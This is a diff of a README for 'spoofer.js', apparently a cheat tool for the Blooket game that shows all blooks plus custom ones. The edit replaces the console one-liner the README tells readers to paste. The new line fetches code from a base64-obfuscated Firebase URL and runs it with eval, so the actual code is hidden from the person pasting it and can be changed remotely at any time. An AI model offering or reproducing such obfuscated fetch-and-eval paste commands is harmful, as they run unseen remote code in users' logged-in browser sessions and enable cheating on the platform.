@@ -21,16 +21,14 @@ fetch(atob('aHR0cHM6Ly9ibG9va2V0LTM0NGM5LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9i
 ```
 
 # spoofer.js
-### **Blooks**
-#### Show all of the blooks in your blook page 
-### **Market**
-#### Adds a custom box to the marketpage
+### Show all of the blooks in your blook page along with custom ones as a special rarity
+
 </br>
 
 Open console (ctrl + shift + j) and paste the following:
 
 ```js
-fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMzA1NzIvc3Bvb2Zlci5qcw==')).then((r) => r.text().then(eval))
+fetch(atob('aHR0cHM6Ly9ibG9va2V0LTM0NGM5LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9zcG9vZmVyLmpzb24=')).then((r) => r.text().then((t)=>eval(JSON.parse(t))))
 ```
 
 ## IOS Mobile Devices
